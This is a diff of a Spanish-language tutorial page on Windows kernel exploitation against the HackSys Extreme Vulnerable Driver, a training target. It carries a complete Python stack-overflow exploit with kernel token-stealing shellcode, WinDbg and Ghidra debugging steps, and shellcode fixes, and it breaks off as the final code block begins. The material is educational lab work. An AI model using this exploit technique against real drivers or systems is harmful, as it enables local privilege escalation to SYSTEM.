-</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8&#39;</span>
-</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61&#39;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode
+</span></span><span class="line"><span class="cl"><span class="c1"># Bytecode generated by Sickle, size: 52 bytes</span>
+</span></span><span class="line"><span class="cl"><span class="nv">shellcode</span> <span class="o">=</span> bytearray<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">shellcode</span> <span class="o">+=</span> b<span class="s1">&#39;\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">shellcode</span> <span class="o">+=</span> b<span class="s1">&#39;\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">shellcode</span> <span class="o">+=</span> b<span class="s1">&#39;\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">shellcode</span> <span class="o">+=</span> b<span class="s1">&#39;\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61&#39;</span>
 </span></span></code></pre></div><p>Realizar los cambios en el PoC como se demuestra aqi:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>GENERIC_READ           <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
-</span></span><span style="display:flex;"><span>GENERIC_WRITE          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
-</span></span><span style="display:flex;"><span>OPEN_EXISTING          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
-</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
-</span></span><span style="display:flex;"><span>MEM_COMMIT             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001000</span>
-</span></span><span style="display:flex;"><span>MEM_RESERVE            <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00002000</span>
-</span></span><span style="display:flex;"><span>PAGE_EXECUTE_READWRITE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000040</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
-</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
-</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
-</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>                               NULL,
-</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
-</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
-</span></span><span style="display:flex;"><span>                               NULL)
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Bytecode generated by Sickle, size: 52 bytes</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">=</span> bytearray()
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1</span><span style="color:#e6db74">&#39;</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00</span><span style="color:#e6db74">&#39;</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x89\x91\xf8\x00\x00\x00\x61</span><span style="color:#e6db74">&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Allocating RWX memory&#34;</span>)
-</span></span><span style="display:flex;"><span>  ptrMemory <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>VirtualAlloc(NULL,
-</span></span><span style="display:flex;"><span>                                    len(shellcode),
-</span></span><span style="display:flex;"><span>                                    (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
-</span></span><span style="display:flex;"><span>                                    PAGE_EXECUTE_READWRITE)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Creating a char array to house shellcode&#34;</span>)
-</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> (c_char <span style="color:#f92672">*</span> len(shellcode))<span style="color:#f92672">.</span>from_buffer(shellcode)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Copying shellcode array into RWX memory&#34;</span>)
-</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>RtlMoveMemory(c_int(ptrMemory), buffer, len(shellcode))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  ptrShellcode <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, ptrMemory)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  buffer  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2080</span>
-</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">+=</span> ptrShellcode
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003&#34;</span>)
-</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
-</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
-</span></span><span style="display:flex;"><span>                           buffer,
-</span></span><span style="display:flex;"><span>                           len(buffer),
-</span></span><span style="display:flex;"><span>                           NULL,
-</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
-</span></span><span style="display:flex;"><span>                           NULL)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>main()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GENERIC_READ</span>           <span class="o">=</span> <span class="mh">0x80000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">GENERIC_WRITE</span>          <span class="o">=</span> <span class="mh">0x40000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">OPEN_EXISTING</span>          <span class="o">=</span> <span class="mh">0x00000003</span>
+</span></span><span class="line"><span class="cl"><span class="n">FILE_ATTRIBUTE_NORMAL</span>  <span class="o">=</span> <span class="mh">0x00000080</span>
+</span></span><span class="line"><span class="cl"><span class="n">MEM_COMMIT</span>             <span class="o">=</span> <span class="mh">0x00001000</span>
+</span></span><span class="line"><span class="cl"><span class="n">MEM_RESERVE</span>            <span class="o">=</span> <span class="mh">0x00002000</span>
+</span></span><span class="line"><span class="cl"><span class="n">PAGE_EXECUTE_READWRITE</span> <span class="o">=</span> <span class="mh">0x00000040</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NULL</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span> <span class="o">=</span> <span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span>
+</span></span><span class="line"><span class="cl">  <span class="n">hHEVD</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">CreateFileA</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\\\\</span><span class="s2">.</span><span class="se">\\</span><span class="s2">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="p">(</span><span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                               <span class="mh">0x00</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">OPEN_EXISTING</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">hHEVD</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1"># python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># Bytecode generated by Sickle, size: 52 bytes</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x89\x91\xf8\x00\x00\x00\x61</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Allocating RWX memory&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ptrMemory</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                    <span class="p">(</span><span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Creating a char array to house shellcode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">c_char</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">.</span><span class="n">from_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Copying shellcode array into RWX memory&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">c_int</span><span class="p">(</span><span class="n">ptrMemory</span><span class="p">),</span> <span class="n">buffer</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">ptrShellcode</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;L&#34;</span><span class="p">,</span> <span class="n">ptrMemory</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">2080</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span> <span class="o">+=</span> <span class="n">ptrShellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Calling control code 0x222003&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span><span class="o">.</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hHEVD</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="mh">0x222003</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">buffer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="nb">len</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="mh">0x00</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">byref</span><span class="p">(</span><span class="n">c_ulong</span><span class="p">()),</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;cmd.exe&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span>
 </span></span></code></pre></div><p>Como vamos a sobrescribir una dirección de regreso, hacer una pausa en <strong>BASE+DISTANCIA</strong>. Podemos obtener esto con Ghidra.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/ret_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/ret_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Aplicar esto a WinDbg.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/offset-ret_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/offset-ret_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Con una pausa configurada, inicie el exploit a el &ldquo;target machine&rdquo;.</p>
 <p>Una vez que llegues a la pausa, podemos ver que estamos a punto de regresar a la región de memoria y ejecutar nuestro código / shellcode (52 &ldquo;bytes&rdquo;).</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bp1_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bp1_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Entremos en esto (<em>t</em>) hasta que la veamos <strong>mov edx, 0x04</strong>. Aqi <em>ECX</em> y <em>EAX</em> debe contener direcciones a <em>_EPROCESS</em>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocEAX.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocEAX.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>La siguiente instrucción mueve el FLINK a dentro de EAX.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/flink_ptr_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/flink_ptr_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Una vez ejecutado, <strong>sub eax, 0xb8</strong> se ejecuta (como estamos atravesando procesos activos).</p>
 <p>Esto efectivamente posiciona EAX a el comienzo de la proxima estructura _EPROCESS.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/next_eproc_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/next_eproc_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Establezcamos un punto de interrupción aqi y ate continuar la ejecución hasta el proceso <em>_EPROCESS.UniqueProcessId</em> es 0x04. Una vez encontrado podemos ver que el salto no se ejecutará!</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/npjmp.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/npjmp.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Ahora el código simplemente copia el token en nuestra estructura _EPROCESS! Parece que estaba equivocada en el último par de notas esto se puede encontrar en el proceso de propiedad.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/owning_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/owning_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Entonces la realidad es que no tenemos que mirar demasiado lejos una vez que tenemos el &ldquo;current thread&hellip;&rdquo; Estaba confundido pero ahora tiene sentido. Puedes ver esto aqi:</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/recap_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/recap_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Ahora podemos continuar ejecutando nuestro shellcode, pero nos estrellamos, ¿por qué?</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/crash_7.png" alt="alt text"></p>
-<h2 id="arreglando-el-choque">Arreglando el Choque</h2>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/crash_7.png" alt="alt text" />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">Arreglando el Choque 
+    <div id="arreglando-el-choque" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#arreglando-el-choque" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 <p>Mirando el estado de los registros aparece que EBP todavía está corrupto. Sin embargo, lo más importante es que nunca regresaremos. Agreguemos una instrucción &ldquo;ret&rdquo; a el shellcode y poner una dirección válida sobre EBP y intentar otra vez.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wetw0rk㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/Sickle/src<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ python3 sickle.py -a x86 -m asm_shell -f c                                            
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ASM Shell loaded <span style="color:#66d9ef">for</span> x86 architecture
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>sickle &gt; a pop ebp
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x5d&#34;</span> // pop ebp
-</span></span><span style="display:flex;"><span>sickle &gt; a ret
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xc3&#34;</span> // ret
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>wetw0rk㉿kali<span class="o">)</span>-<span class="o">[</span>/opt/Sickle/src<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python3 sickle.py -a x86 -m asm_shell -f c                                            
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ASM Shell loaded <span class="k">for</span> x86 architecture
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sickle &gt; a pop ebp
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x5d&#34;</span> // pop ebp
+</span></span><span class="line"><span class="cl">sickle &gt; a ret
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xc3&#34;</span> // ret
 </span></span></code></pre></div><p>Una vez que cambiamos el PoC y lo enviamos, todavía chocamos. Así que decidí mirar Ghidra, y puedes ver que la instrucción &ldquo;ret&rdquo; en realidad es <em>RET 0x8</em>. Vamos intentar de nuevo&hellip;</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/lr_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/lr_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>El código final se puede ver aqi:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>GENERIC_READ           <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
-</span></span><span style="display:flex;"><span>GENERIC_WRITE          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
-</span></span><span style="display:flex;"><span>OPEN_EXISTING          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
-</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
-</span></span><span style="display:flex;"><span>MEM_COMMIT             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001000</span>
-</span></span><span style="display:flex;"><span>MEM_RESERVE            <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00002000</span>
-</span></span><span style="display:flex;"><span>PAGE_EXECUTE_READWRITE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000040</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
-</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
-</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
-</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>                               NULL,
-</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
-</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
-</span></span><span style="display:flex;"><span>                               NULL)
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">=</span> bytearray()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># python3 sickle.py -a x86 -v shellcode -p windows/x86/kernel_token_stealer -f python3 -m pinpoint</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x60</span><span style="color:#e6db74">&#39;</span>                         <span style="color:#75715e"># pushal </span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#39;</span>                     <span style="color:#75715e"># xor eax, eax</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x64\x8b\x80\x24\x01\x00\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># mov eax, dword ptr fs:[eax + 0x124]</span>
